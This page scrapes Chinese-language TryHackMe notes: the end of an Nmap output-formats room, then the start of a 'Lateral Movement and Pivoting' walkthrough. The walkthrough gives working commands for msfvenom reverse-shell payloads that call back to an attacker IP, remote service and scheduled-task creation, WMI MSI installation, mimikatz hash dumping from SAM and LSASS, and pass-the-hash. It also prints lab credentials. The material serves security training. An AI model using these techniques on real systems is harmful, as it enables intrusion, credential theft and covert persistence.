上的 /usr/share/nmap/scripts 中。脚本 http-robots.txt 检查什么？ 如果尚未启动 AttackBox，请启动它。确保已从任务 2 终止 VM 后，启动此任务的目标计算机。在 AttackBox 上，使用默认脚本 -sC 针对 10.10.104.195 运行 Nmap。您会注意到有一个服务正在侦听端口 53。它的完整版本值是多少？ nmap -sC -sS -T4 10.10.104.195 根据其描述，脚本 ssh2-enum-algos “报告目标 SSH2 服务器提供的算法数量（用于加密、压缩等）。”依赖于“sha1”并受 10.10.104.195 支持的密钥交换算法 (kex_algorithms) 的名称是什么？ nmap -sS --script \"ssh2-enum-algos\" 10.10.104.195 保存输出 每当您运行Nmap扫描时，将结果保存在文件中是合理的。选择和采用良好的命名约定对于文件名至关重要。文件数量可能会快速增长，并且可能妨碍您查找先前的扫描结果。主要的三种格式有： Normal Grepable (grepable) XML 我们不推荐第四种：Script Kiddie 脚本小子 Normal 普通的 顾名思义，正常格式类似于扫描目标时在屏幕上获得的输出。您可以使用 -oN FILENAME 以正常格式保存扫描结果； N代表正常。这是结果的示例。 pentester@TryHackMe$ cat 10.10.87.205_scan.nmap # Nmap 7.60 scan initiated Fri Sep 10 05:14:19 2021 as: nmap -sS -sV -O -oN 10.10.87.205_scan MACHINE_IP Nmap scan report for 10.10.87.205 Host is up (0.00086s latency). Not shown: 994 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0) 25/tcp open smtp Postfix smtpd 80/tcp open http nginx 1.6.2 110/tcp open pop3 Dovecot pop3d 111/tcp open rpcbind 2-4 (RPC #100000) 143/tcp open imap Dovecot imapd MAC Address: 02:A0:E7:B5:B6:C5 (Unknown) Device type: general purpose Running: Linux 3.X OS CPE: cpe:/o:linux:linux_kernel:3.13 OS details: Linux 3.13 Network Distance: 1 hop Service Info: Host: debra2.thm.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Sep 10 05:14:28 2021 -- 1 IP address (1 host up) scanned in 9.99 seconds Grepable grepable 格式的名称来自命令 grep ； grep 代表全局正则表达式打印机。简而言之，它可以高效地过滤扫描输出中的特定关键字或术语。您可以使用 -oG FILENAME 将扫描结果保存为 grepable 格式。上面以正常格式显示的扫描输出使用 grepable 格式显示在下面的控制台中。正常输出为21行；然而，grepable 输出只有 4 行。主要原因是 Nmap 希望在用户应用 grep 时使每一行都有意义且完整。因此，在 grepable 输出中，与正常输出相比，行很长并且不方便阅读。 pentester@TryHackMe$ cat 10.10.87.205_scan.gnmap # Nmap 7.60 scan initiated Fri Sep 10 05:14:19 2021 as: nmap -sS -sV -O -oG 10.10.87.205_scan MACHINE_IP Host: 10.10.87.205\tStatus: Up Host: MACHINE_IP\tPorts: 22/open/tcp//ssh//OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)/, 25/open/tcp//smtp//Postfix smtpd/, 80/open/tcp//http//nginx 1.6.2/, 110/open/tcp//pop3//Dovecot pop3d/, 111/open/tcp//rpcbind//2-4 (RPC #100000)/, 143/open/tcp//imap//Dovecot imapd/\tIgnored State: closed (994)\tOS: Linux 3.13\tSeq Index: 257\tIP ID Seq: All zeros # Nmap done at Fri Sep 10 05:14:28 2021 -- 1 IP address (1 host up) scanned in 9.99 seconds grep 的一个使用示例是 grep KEYWORD TEXT_FILE ；该命令将显示包含所提供的关键字的所有行。让我们比较一下在正常输出和 grepable 输出上使用 grep 的输出。您会注意到，前者不提供主机的 IP 地址。相反，它返回 80/tcp open http nginx 1.6.2 ，如果您要筛选多个系统的扫描结果，这会非常不方便。然而，后者在每一行中提供了足够的信息，例如主机的 IP 地址，以使其完整。 pentester@TryHackMe$ grep http 10.10.87.205_scan.nmap 80/tcp open http nginx 1.6.2 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . pentester@TryHackMe$ grep http 10.10.87.205_scan.gnmap Host: 10.10.87.205\tPorts: 22/open/tcp//ssh//OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)/, 25/open/tcp//smtp//Postfix smtpd/, 80/open/tcp//http//nginx 1.6.2/, 110/open/tcp//pop3//Dovecot pop3d/, 111/open/tcp//rpcbind//2-4 (RPC #100000)/, 143/open/tcp//imap//Dovecot imapd/\tIgnored State: closed (994)\tOS: Linux 3.13\tSeq Index: 257\tIP ID Seq: All zeros XML 第三种格式是XML。您可以使用-oX FILENAME将扫描结果以XML格式保存。XML格式最方便用于在其他程序中处理输出。方便的是，您可以使用-oA FILENAME将扫描输出以所有三种格式保存，即结合了普通格式（-oN）、可grep格式（-oG）和XML格式（-oX）。 脚本小子 第四种格式是脚本小子。您可以看到，如果您想在输出中搜索任何有趣的关键字或保留结果以供将来参考，则此格式毫无用处。但是，您可以使用它来保存扫描的输出 nmap -sS 127.0.0.1 -oS FILENAME ，显示输出文件名，并在不懂技术的朋友面前查看 31337 。 pentester@TryHackMe$ cat 10.10.87.205_scan.kiddie $tart!ng nMaP 7.60 ( httpz://nMap.0rG ) at 2021-09-10 05:17 B$T Nmap scan rEp0rt f0r |p-10-10-161-170.EU-w3$t-1.C0mputE.intErnaL (10.10.161.170) HOSt !s uP (0.00095s LatEncy). N0T $H0wn: 994 closed pOrtS PoRT st4Te SeRViC3 VERS1on 22/tcp Open ssH Op3n$$H 6.7p1 Deb|an 5+dEb8u8 (pr0t0COl 2.0) 25/tCp Op3n SmTp P0$Tf!x Smtpd 80/tcp 0p3n http Ng1nx 1.6.2 110/tCP 0pen pOP3 d0v3coT P0p3D 111/TcP op3n RpcbInd 2-4 (RPC #100000) 143/Tcp opEn Imap Dovecot 1mApd mAC 4Ddr3sz: 02:40:e7:B5:B6:c5 (Unknown) Netw0rk d!stanc3: 1 h0p $3rv1c3 InFO: Ho$t: dEBra2.thM.lOcal; 0s: Linux; cPe: cP3:/0:linux:l|nux_k3rnel 0S and servIc3 D3tEcti0n pErf0rm3d. Plea$e r3p0rt any !nc0RrecT rE$ultz at hTtpz://nmap.0rg/$ubmit/ . Nmap d0nE: 1 |P addr3SS (1 hoSt up) $CaNnEd !n 21.80 s3c0Ndz 终止上一个任务的目标机器并启动本任务的目标机器。在 AttackBox 终端上，发出命令 scp pentester@10.10.87.205:/home/pentester/* . 从目标虚拟机下载正常格式和 grepable 格式的 Nmap 报告。 请注意，用户名 pentester 的密码为 THM17577 检查附加的 Nmap 日志。有多少系统正在侦听 HTTPS 端口？ 总结 在这个房间中，我们学习了如何检测正在运行的服务及其版本以及主机操作系统。我们学习了如何启用跟踪路由，并介绍了选择一个或多个脚本来帮助渗透测试。最后，我们介绍了保存扫描结果以供将来参考的不同格式。下表总结了我们在这个房间中讨论的最重要的选项。 Option 选项 Meaning 意义 -sV 确定开放端口上的服务/版本信息 -sV --version-light 尝试最有可能的探针 (2) -sV --version-all 尝试所有可用的探针 (9) -O 检测操作系统 --traceroute 运行traceroute到目标 --script=SCRIPTS 要运行的 Nmap 脚本 -sC or --script=default -sC 或 --script=default 运行默认脚本 -A 相当于 -sV -O -sC --traceroute -oN 以正常格式保存输出 -oG 以 grepable 格式保存输出 -oX 以 XML 格式保存输出 -oA 以普通、XML 和 Grepable 格式保存输出","tags":["TryHackMe"],"categories":["TryHackMe"]},{"title":"THM-Lateral Movement and Pivoting","path":"/2024/02/16/thm-lateral-movement-and-pivoting/","content":"0x01 简介 在这个房间里，我们将研究横向移动，攻击者使用一组技术在网络中移动，同时创建尽可能少的警报。我们将了解为此目的而使用的几种常见技术以及所涉及的工具. 建议在此之前先浏览一下入侵 AD 和枚举 AD 房间。 学习目标 熟悉攻击者使用的横向移动技术。 了解如何使用替代认证材料进行横向移动。 了解使用受感染主机作为枢纽的不同方法。 索取您的凭证 为了模拟 AD 违规，您将获得第一组 AD 凭据。网络设置完成后，在攻击箱上导航至 http://distributor.za.tryhackme.com/creds 以请求您的凭据对。单击“获取凭据”按钮以接收可用于初始访问的凭据对。 此凭证对将为您提供对 THMJMP2.za.tryhackme.com 的 SSH 访问。 THMJMP2 可以被视为进入该环境的跳转主机，模拟您已实现的立足点。 对于 SSH 访问，您可以使用以下命令： ssh za\\\\&lt;AD Username&gt;@thmjmp2.za.tryhackme.com //获取到的凭证如下 Your credentials have been generated: Username: henry.bird Password: Changeme123 即:ssh za\\\\henry.bird@thmjmp2.za.tryhackme.com 0x02 通过网络移动 什么是横向运动？ 简而言之，横向移动是攻击者用来在网络中移动的一组技术。一旦攻击者获得对网络第一台计算机的访问权，出于多种原因，移动就变得至关重要，其中包括： - 实现攻击者的目标 - 绕过现有的网络限制 - 建立额外的网络入口点 - 制造混乱和避免被发现。 虽然许多网络杀伤链将横向移动视为线性过程的附加步骤，但它实际上是循环的一部分。在此周期中，我们使用任何可用的凭据来执行横向移动，使我们能够访问新机器，在其中我们可以提升权限并提取凭据（如果可能）。有了新的凭证，循环又开始了。 通常，我们会重复这个循环几次，然后才能达到网络上的最终目标。如果我们的第一个立足点是一台几乎无法访问其他网络资源的计算机，那么我们可能需要横向移动到在网络上拥有更多权限的其他主机。 一个简单的例子 假设我们正在执行红队参与，我们的最终目标是到达内部代码存储库，我们通过网络钓鱼活动在目标网络上获得了第一次妥协。通常，网络钓鱼活动对非技术用户更有效，因此我们的第一次访问可能是通过营销部门的机器进行的。 营销工作站通常会受到防火墙策略的限制，无法访问网络上的任何关键服务，包括管理协议、数据库端口、监控服务或日常工作不需要的任何其他服务，包括代码存储库。 为了到达敏感的主机和服务，我们需要转移到其他主机并从那里转向我们的最终目标。为此，我们可以尝试提升营销工作站的权限并提取本地用户的密码哈希值。如果我们找到本地管理员，则其他主机上可能存在相同的帐户。经过一番侦察，我们发现了一个名为 DEV-001-PC 的工作站。我们使用本地管理员的密码哈希来访问 DEV-001-PC，并确认它属于公司的一位开发人员所有。从那里，可以访问我们的目标代码存储库。 请注意，虽然可能需要使用横向移动来规避防火墙限制，但它也有助于逃避检测。在我们的示例中，即使营销工作站可以直接访问代码存储库，也可能需要通过开发人员的 PC 进行连接。从检查登录审核日志的蓝队分析师的角度来看，这种行为的可疑性较小。 攻击者的视角 攻击者可以通过多种方式进行横向移动。最简单的方法是使用标准管理协议（例如 WinRM、RDP、VNC 或 SSH）连接到网络上的其他计算机。只要在规划与哪个帐户连接的位置时保持一定的一致性，这种方法就可以在某种程度上模拟常规用户的行为。虽然 IT 部门的用户通过 RDP 连接到 Web 服务器可能很常见并且不会受到关注，但必须注意不要尝试可疑的连接（例如，为什么本地管理员用户从营销部门连接到 DEV-001-PC）个人电脑？）. 如今，攻击者还可以使用其他横向移动方法，同时使蓝队有效检测正在发生的情况变得更具挑战性。虽然没有任何技术应该被认为是万无一失的，但我们至少可以尝试尽可能保持沉默。在接下来的任务中，我们将了解一些最常见的横向运动技术。 管理员和UAC 在执行整个房间中介绍的大部分横向移动技术时，我们将主要使用管理员凭据。虽然人们可能期望每个管理员帐户都具有相同的目的，但必须区分两种类型的管理员： 本地帐户属于本地管理员组 域帐户属于本地管理员组 我们感兴趣的差异是用户帐户控制 (UAC) 对本地管理员（默认管理员帐户除外）施加的限制。默认情况下，除非通过 RDP 使用交互式会话，否则本地管理员将无法远程连接到计算机并执行管理任务。 Windows 将拒绝通过 RPC、SMB 或 WinRM 请求的任何管理任务，因为此类管理员将使用经过过滤的介质完整性令牌登录，从而防止帐户执行特权操作。唯一获得完全权限的本地帐户是默认管理员帐户。 具有本地管理权限的域帐户不会受到相同的处理，并且将以完全管理权限登录。 如果需要，可以禁用此安全功能，有时您会发现管理员组中的本地帐户和域帐户之间没有区别。不过，重要的是要记住，如果某些横向移动技术失败，可能是由于使用了强制执行 UAC 的非默认本地管理员。您可以在此处阅读有关此安全功能的更多详细信息：here 0x03 远程生成过程 此任务将研究攻击者远程生成进程的可用方法，允许他们在拥有有效凭据的计算机上运行命令。所讨论的每种技术都使用略有不同的方法来实现相同的目的，其中一些可能更适合某些特定场景。 Psexec 执行程序 Ports: 445/TCP (SMB) 所需的组成员身份：管理员 多年来，Psexec 一直是需要远程执行进程时的首选方法。它允许管理员用户在他有权访问的任何 PC 上远程运行命令。 Psexec 是众多 Sysinternals 工具之一，可以在此处下载：here psexec 的工作方式如下： 连接到 Admin$ 共享并上传服务二进制文件。 Psexec 使用 psexesvc.exe 作为名称。 连接到服务控制管理器以创建并运行名为 PSEXESVC 的服务，并将服务二进制文件与 C:\\Windows\\psexesvc.exe 关联。 创建一些命名管道来处理 stdin/stdout/stderr。 要运行 psexec，我们只需提供远程主机所需的管理员凭据以及我们要运行的命令（为方便起见， psexec64.exe 可在 THMJMP2 中的 C:\\tools 下找到）： psexec64.exe \\\\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe 使用 WinRM 远程创建进程 Ports: 5985/TCP (WinRM HTTP) 所需的组成员身份：远程管理用户 Windows 远程管理 (WinRM) 是一种基于 Web 的协议，用于远程向 Windows 主机发送 Powershell 命令。大多数 Windows Server 安装都会默认启用 WinRM，这使其成为一个有吸引力的攻击媒介。 要从命令行连接到远程 Powershell 会话，我们可以使用以下命令： winrs.exe -u:Administrator -p:Mypass123 -r:target cmd 我们可以从 Powershell 实现相同的目的，但要传递不同的凭据，我们需要创建一个 PSCredential 对象： $username = 'Administrator'; $password = 'Mypass123'; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; 获得 PSCredential 对象后，我们可以使用 Enter-PSSession cmdlet 创建交互式会话： Enter-PSSession -Computername TARGET -Credential $credential Powershell 还包括 Invoke-Command cmdlet，它通过 WinRM 远程运行 ScriptBlocks。凭证也必须通过 PSCredential 对象传递： Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami} 使用 sc 远程创建服务 Ports: 端口： 135/TCP、49152-65535/TCP（DCE/RPC） 445/TCP（基于 SMB 命名管道的 RPC） 139/TCP（基于 SMB 命名管道的 RPC） 所需的组成员身份：管理员 Windows 服务也可用于运行任意命令，因为它们在启动时执行命令。虽然服务可执行文件在技术上与常规应用程序不同，但如果我们配置 Windows 服务来运行任何应用程序，它仍然会执行该应用程序并随后失败。 我们可以使用 sc.exe（Windows 中提供的标准工具）在远程主机上创建服务。使用sc时，它会通过几种方式尝试通过RPC连接到Service Control Manager（SVCCTL）远程服务程序： 将使用 DCE/RPC 进行连接尝试。客户端将首先在端口 135 连接到端点映射器 (EPM)，该端点映射器充当可用 RPC 端点的目录并请求有关 SVCCTL 服务程序的信息。然后，EPM 将响应 IP 和端口以连接到 SVCCTL，该端口通常是 49152-65535 范围内的动态端口。 如果后一个连接失败，sc 将尝试通过端口 445 (SMB) 或 139（基于 NetBIOS 的 SMB）上的 SMB 命名管道到达 SVCCTL。 我们可以使用以下命令创建并启动名为“THMservice”的服务： sc.exe \\\\TARGET create THMservice binPath= \"net user munra Pass123 /add\" start= auto sc.exe \\\\TARGET start THMservice 服务启动时将执行“net user”命令，在系统上创建一个新的本地用户。由于操作系统负责启动服务，因此您将无法查看命令输出。 要停止并删除该服务，我们可以执行以下命令： sc.exe \\\\TARGET stop THMservice sc.exe \\\\TARGET delete THMservice 远程创建计划任务 我们可以使用的另一个 Windows 功能是计划任务。您可以使用 schtasks 远程创建并运行一个任务，该任务可在任何 Windows 安装中使用。要创建名为 THMtask1 的任务，我们可以使用以下命令： schtasks /s TARGET /RU \"SYSTEM\" /create /tn \"THMtask1\" /tr \"&lt;command/payload to execute&gt;\" /sc ONCE /sd 01/01/1970 /st 00:00 schtasks /s TARGET /run /TN \"THMtask1\" 我们将计划类型 (/sc) 设置为 ONCE，这意味着该任务仅在指定的时间和日期运行一次。由于我们将手动运行任务，因此开始日期 (/sd) 和开始时间 (/st) 无论如何都不重要。 由于系统将运行计划任务，因此我们将无法获得该命令的输出，这使得这是一种盲目攻击。 最后，要删除计划任务，我们可以使用以下命令并自行清理： schtasks /S TARGET /TN \"THMtask1\" /DELETE /F 实践练习 对于本练习，我们假设我们已经捕获了一些具有管理访问权限的凭据： User: ZA.TRYHACKME.COM\\t1_leonard.summers Password: EZpass4ever 我们将展示如何使用这些凭据通过 sc.exe 横向移动到 THMIIS。请随意尝试其他方法，因为它们都应该适用于 THMIIS。 虽然我们已经展示了如何使用 sc 在远程系统上创建用户（通过使用 net user ），但我们还可以上传我们想要执行的任何二进制文件并将其与创建的服务关联。但是，如果我们尝试使用此方法运行反向 shell，我们会注意到反向 shell 在执行后立即断开连接。原因是服务可执行文件与标准 .exe 文件不同，因此非服务可执行文件几乎会立即被服务管理器杀死。对我们来说幸运的是，msfvenom 支持 exe-service 格式，它将我们喜欢的任何有效负载封装在功能齐全的服务可执行文件中，防止其被杀死。 要创建反向shell，我们可以使用以下命令： 注意：由于您将与其他人共享实验室，因此您需要为有效负载使用不同的文件名，而不是“myservice.exe”，以避免覆盖其他人的有效负载。 msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=10.50.46.236 LPORT=5555 -o bcxservice.exe 然后，我们将继续使用 t1_leonard.summers 凭据，使用 AttackBox 中的 smbclient 将有效负载上传到 THMIIS 的 ADMIN$ 共享： smbclient -c 'put bcxservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever 上传可执行文件后，我们将在攻击者的计算机上设置一个侦听器以接收来自 msfconsole 的反向 shell： user@AttackBox$ msfconsole msf6 &gt; use exploit/multi/handler msf6 exploit(multi/handler) &gt; set LHOST 10.50.46.236 msf6 exploit(multi/handler) &gt; set LPORT 5555 msf6 exploit(multi/handler) &gt; set payload windows/shell/reverse_tcp msf6 exploit(multi/handler) &gt; exploit [*] Started reverse TCP handler on 10.50.46.236:5555 或者，您可以在 Linux 控制台上运行以下单行代码来执行相同的操作： msfconsole -q -x \"use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST 10.50.46.236; set LPORT 5555;exploit\" 由于 sc.exe 不允许我们在命令中指定凭据，因此我们需要使用 runas 使用 t1_leonard.summer 的访问令牌生成一个新 shell。尽管如此，我们只能通过 SSH 访问计算机，因此如果我们尝试类似 runas /netonly /user:ZA\\t1_leonard.summers cmd.exe 的内容，新的命令提示符将在用户会话中生成，但我们无法访问它。为了解决这个问题，我们可以使用 runas 生成带有 t1_leonard.summers 访问令牌的第二个反向 shell： runas /netonly /user:ZA.TRYHACKME.COM\\t1_leonard.summers \"c:\\tools c64.exe -e cmd.exe 10.50.46.236 6666\" 注意：请记住，由于您将 runas 与 /netonly 选项一起使用，因此不会费心检查所提供的凭据是否有效（有关此的更多信息，请参阅枚举 AD 室），因此请务必正确输入密码。如果不这样做，您稍后会在房间中看到一些 ACCESS DENIED 错误。 我们可以像往常一样在 AttackBox 中使用 nc 接收反向 shell 连接： nc -lvnp 6666 最后，继续使用 sc 远程创建一个新服务，并将其与我们上传的二进制文件关联起来： C:\\&gt; sc.exe \\\\thmiis.za.tryhackme.com create THMservice-bcx binPath= \"%windir%\\bcxservice.exe\" start= auto C:\\&gt; sc.exe \\\\thmiis.za.tryhackme.com start THMservice-bcx 请务必更改您的服务名称，以避免与其他学生发生冲突。 启动该服务后，您应该会在 AttackBox 中收到一个连接，您可以从该连接访问 t1_leonard.summers 桌面上的第一个标志。 0x04 使用 WMI 横向移动 我们还可以使用 Windows Management Instrumentation (WMI) 以不同的方式执行上一个任务中讨论的许多技术。 WMI 是基于 Web 的企业管理 (WBEM) 的 Windows 实现，WBEM 是跨设备访问管理信息的企业标准。 简单来说，WMI 允许管理员执行标准管理任务，攻击者可以滥用这些任务以各种方式执行横向移动，我们将对此进行讨论。 从 Powershell 连接到 WMI 在能够使用 Powershell 命令连接到 WMI 之前，我们需要使用我们的用户和密码创建一个 PSCredential 对象。该对象将存储在 $credential 变量中，并在该任务的整个技术中使用： $username = 'Administrator'; $password = 'Mypass123'; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; 然后，我们继续使用以下协议之一建立 WMI 会话： DCOM：RPC over IP 将用于连接到 WMI。该协议使用端口 135/TCP 和端口 49152-65535/TCP，正如使用 sc.exe 时所解释的那样。 Wsman：WinRM 将用于连接到 WMI。此协议使用端口 5985/TCP (WinRM HTTP) 或 5986/TCP (WinRM HTTPS)。 要从 Powershell 建立 WMI 会话，我们可以使用以下命令并将会话存储在 $Session 变量中，我们将在整个房间中使用不同的技术： $Opt = New-CimSessionOption -Protocol DCOM $Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop New-CimSessionOption cmdlet 用于配置 WMI 会话的连接选项，包括连接协议。然后，选项和凭据将传递到 New-CimSession cmdlet 以建立针对远程主机的会话。 使用 WMI 远程创建进程 Ports: 135/TCP, 49152-65535/TCP (DCERPC) 5985/TCP (WinRM HTTP) 或 5986/TCP (WinRM HTTPS) 所需的组成员身份：管理员 我们可以利用 Windows Management Instrumentation (WMI) 从 Powershell 远程生成一个进程，向 Win32_Process 类发送 WMI 请求，以在我们之前创建的会话下生成该进程： $Command = \"powershell.exe -Command Set-Content -Path C:\\text.txt -Value munrawashere\"; Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $Command } 请注意，WMI 不允许您查看任何命令的输出，但确实会静默创建所需的进程。 在旧系统上，可以在命令提示符下使用 wmic 完成相同的操作： wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create \"cmd.exe /c calc.exe\" 使用 WMI 远程创建服务 Ports: 135/TCP, 49152-65535/TCP (DCERPC) 5985/TCP (WinRM HTTP) 或 5986/TCP (WinRM HTTPS) 所需的组成员身份：管理员 我们可以通过Powershell使用WMI创建服务。要创建名为 THMService2 的服务，我们可以使用以下命令： Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{ Name = \"THMService2\"; DisplayName = \"THMService2\"; PathName = \"net user munra2 Pass123 /add\"; # Your payload ServiceType = [byte]::Parse(\"16\"); # Win32OwnProcess : Start service in a new process StartMode = \"Manual\" } 然后，我们可以获取该服务的句柄并使用以下命令启动它： $Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter \"Name LIKE 'THMService2'\" Invoke-CimMethod -InputObject $Service -MethodName StartService 最后，我们可以使用以下命令停止并删除该服务： Invoke-CimMethod -InputObject $Service -MethodName StopService Invoke-CimMethod -InputObject $Service -MethodName Delete 使用 WMI 远程创建计划任务 Ports: 135/TCP, 49152-65535/TCP (DCERPC) 5985/TCP (WinRM HTTP) 或 5986/TCP (WinRM HTTPS) 所需的组成员身份：管理员 我们可以使用 Windows 默认安装中提供的一些 cmdlet 创建并执行计划任务： # Payload must be split in Command and Args $Command = \"cmd.exe\" $Args = \"/c net user munra22 aSdf1234 /add\" $Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args Register-ScheduledTask -CimSession $Session -Action $Action -User \"NT AUTHORITY\\SYSTEM\" -TaskName \"THMtask2\" Start-ScheduledTask -CimSession $Session -TaskName \"THMtask2\" 要在使用完计划任务后将其删除，我们可以使用以下命令： Unregister-ScheduledTask -CimSession $Session -TaskName \"THMtask2\" WMI 通过 WMI 安装 MSI 包 Ports: 135/TCP, 49152-65535/TCP (DCERPC) 5985/TCP (WinRM HTTP) 或 5986/TCP (WinRM HTTPS) 所需的组成员身份：管理员 MSI 是一种用于安装程序的文件格式。如果我们可以将 MSI 包复制到目标系统，那么我们就可以使用 WMI 尝试为我们安装它。攻击者可以通过任何可用的方式复制该文件。一旦 MSI 文件位于目标系统中，我们就可以尝试通过 WMI 调用 Win32_Product 类来安装它： Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = \"C:\\Windows\\myinstaller.msi\"; Options = \"\"; AllUsers = $false} 我们可以通过在遗留系统中使用 wmic 来实现相同的目的： wmic /node:TARGET /user:DOMAIN\\USER product call install PackageLocation=c:\\Windows\\myinstaller.msi 实践练习 对于本练习，我们假设我们已经捕获了一些具有管理访问权限的凭据： 用户：ZA.TRYHACKME.COM\\t1_corine.waters Password: Korine.1994 我们将展示如何使用这些凭据通过 WMI 和 MSI 包横向移动到 THM-IIS。请随意尝试此任务中介绍的其他方法。 我们将首先从攻击者机器上使用 msfvenom 创建 MSI 有效负载： 注意：由于您将与其他人共享实验室，因此您需要为有效负载使用不同的文件名，而不是“myinstaller.msi”，以避免覆盖其他人的有效负载。 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.50.46.236 LPORT=5555 -f msi &gt; bcxinstaller.msi 然后，我们使用 SMB 或任何其他可用的方法复制有效负载： smbclient -c 'put bcxinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994 由于我们将有效负载复制到 ADMIN$ 共享，因此它将在服务器上的 C:\\Windows\\ 中可用。 我们启动一个处理程序来接收来自 Metasploit 的反向 shell： msf6 exploit(multi/handler) &gt; set LHOST 10.50.46.236 msf6 exploit(multi/handler) &gt; set LPORT 5555 msf6 exploit(multi/handler) &gt; set payload windows/x64/shell_reverse_tcp msf6 exploit(multi/handler) &gt; exploit 让我们从 Powershell 控制台启动针对 THMIIS 的 WMI 会话： PS C:\\&gt; $username = 't1_corine.waters'; PS C:\\&gt; $password = 'Korine.1994'; PS C:\\&gt; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; PS C:\\&gt; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; PS C:\\&gt; $Opt = New-CimSessionOption -Protocol DCOM PS C:\\&gt; $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop 然后，我们从 Win32_Product 类调用 Install 方法来触发有效负载： PS C:\\&gt; Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = \"C:\\Windows\\bcxinstaller.msi\"; Options = \"\"; AllUsers = $false} 因此，您应该在 AttackBox 中收到一个连接，您可以通过该连接访问 t1_corine.waters 桌面上的标志。 0x05 使用替代认证材料 通过替代身份验证材料，我们指的是可用于访问 Windows 帐户而无需实际知道用户密码本身的任何数据。这是可能的，因为 Windows 网络使用的某些身份验证协议的工作方式。在此任务中，我们将研究当网络上存在以下任一身份验证协议时可作为用户登录的几种替代方案： NTLM认证 Kerberos 身份验证 注意：在此任务中，假定您熟悉从主机提取凭据的方法和工具。 Mimikatz 将被用作整个房间中凭证提取的首选工具。 NTLM认证 在深入研究实际的横向移动技术之前，我们先看一下 NTLM 身份验证的工作原理： 客户端向他们想要访问的服务器发送身份验证请求。 服务器生成一个随机数并将其作为质询发送给客户端。 客户端将其 NTLM 密码哈希与质询（以及其他已知数据）结合起来，生成对质询的响应，并将其发送回服务器进行验证。 服务器将质询和响应转发给域控制器进行验证。 域控制器使用质询重新计算响应并将其与客户端发送的初始响应进行比较。如果两者匹配，则客户端通过身份验证；否则，访问将被拒绝。认证结果发送回服务器。 服务器将认证结果转发给客户端。 注意：所描述的过程适用于使用域帐户时。如果使用本地帐户，服务器可以验证对质询本身的响应，而无需与域控制器交互，因为它的 SAM 上本地存储有密码哈希值。 传递哈希值 从我们获得管理权限的主机中提取凭据（通过使用 mimikatz 或类似工具）后，我们可能会获得可以轻松破解的明文密码或哈希值。然而，如果我们不够幸运，我们最终会得到未破解的 NTLM 密码哈希值。 尽管我们似乎无法真正使用这些哈希值，但只需知道密码哈希值即可响应身份验证期间发送的 NTLM 质询。这意味着我们可以在不需要知道明文密码的情况下进行身份验证。如果 Windows 域配置为使用 NTLM 身份验证，则无需破解 NTLM 哈希值，我们就可以传递哈希值 (PtH) 并成功进行身份验证。 要提取 NTLM 哈希值，我们可以使用 mimikatz 读取本地 SAM 或直接从 LSASS 内存中提取哈希值。 从本地 SAM 中提取 NTLM 哈希值 此方法仅允许您从计算机上的本地用户获取哈希值。没有域用户的哈希值可用。 mimikatz # privilege::debug mimikatz # token::elevate mimikatz # lsadump::sam RID : 000001f4 (500) User : Administrator Hash NTLM: 145e02c50333951f71d13c245d352b50 从 LSASS 内存中提取 NTLM 哈希值 此方法将允许您提取本地用户和最近登录到计算机的任何域用户的任何 NTLM 哈希值。 mimikatz # privilege::debug mimikatz # token::elevate mimikatz # sekurlsa::msv Authentication Id : 0 ; 308124 (00000000:0004b39c) Session : RemoteInteractive from 2 User Name : bob.jenkins Domain : ZA Logon Server : THMDC Logon Time : 2022/04/22 09:55:02 SID : S-1-5-21-3330634377-1326264276-632209373-4605 msv : [00000003] Primary * Username : bob.jenkins * Domain : ZA * NTLM : 6b4a57f67805a663c818106dc0648484 然后，我们可以使用提取的哈希值来执行 PtH 攻击，方法是使用 mimikatz 在反向 shell（或您喜欢的任何其他命令）上为受害者用户注入访问令牌，如下所示： mimikatz # token::revert mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:\"c:\\tools c64.exe -e cmd.exe ATTACKER_IP 5555\" 请注意，我们使用 token::revert 来重新建立原始令牌权限，因为尝试使用提升的令牌传递哈希将不起作用。 这相当于使用 runas /netonly 但使用哈希而不是密码，并将生成一个新的反向 shell，我们可以从其中以受害者用户身份启动任何命令。 要接收反向 shell，我们应该在 AttackBox 上运行反向侦听器： nc -lvp 5555 有趣的是，如果您在此 shell 上运行 whoami 命令，它仍然会显示您在执行 PtH 之前使用的原始用户，但从这里运行的任何命令实际上都会使用我们使用 PtH 注入的凭据。 使用 Linux 传递哈希 如果您可以访问 Linux 盒子（如 AttackBox），有几个工具具有内置支持，可以使用不同的协议执行 PtH。根据您可以使用的服务，您可以执行以下操作： 使用 PtH 连接到 RDP： xfreerdp /v:VICTIM_IP /u:DOMAIN\\\\MyUser /pth:NTLM_HASH 使用 PtH 通过 psexec 连接： psexec.py 